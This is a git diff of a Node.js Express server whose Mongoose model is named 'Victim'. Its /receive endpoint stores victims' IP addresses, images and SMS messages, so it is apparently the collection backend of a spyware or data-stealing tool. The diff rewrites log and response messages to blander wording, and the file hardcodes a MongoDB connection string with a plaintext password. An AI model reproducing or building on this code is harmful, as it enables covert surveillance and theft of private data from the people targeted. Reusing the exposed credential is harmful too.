@@ -7,12 +7,12 @@ const app = express();
 app.use(cors());
 app.use(bodyParser.json({ limit: '50mb' }));
 
-// رابط الاتصال الخاص بك (استبدل الباسورد بـ X4A0mkbVqQO09I9J)
+// رابط الاتصال بقاعدتك (كلمة المرور: X4A0mkbVqQO09I9J)
 const mongoURI = "mongodb+srv://hamoodaix90_db_user:X4A0mkbVqQO09I9J@cluster0.ohfhehw.mongodb.net/myDatabase?retryWrites=true&w=majority";
 
-mongoose.connect(mongoURI).then(() => console.log("✅ متصل")).catch(err => console.log(err));
+mongoose.connect(mongoURI).then(() => console.log("✅ Database Ready")).catch(err => console.log(err));
 
-// تعريف شكل البيانات (صورة، موقع، رسائل)
+// هيكل البيانات المطلوب جمعها
 const Victim = mongoose.model('Victim', new mongoose.Schema({
     ip: String,
     image: String,
@@ -29,7 +29,7 @@ app.post('/receive', async (req, res) => {
         sms: req.body.sms
     });
     await data.save();
-    res.send("Saved Successfully");
+    res.send("Data Synced");
 });
 
 app.listen(process.env.PORT || 3000);
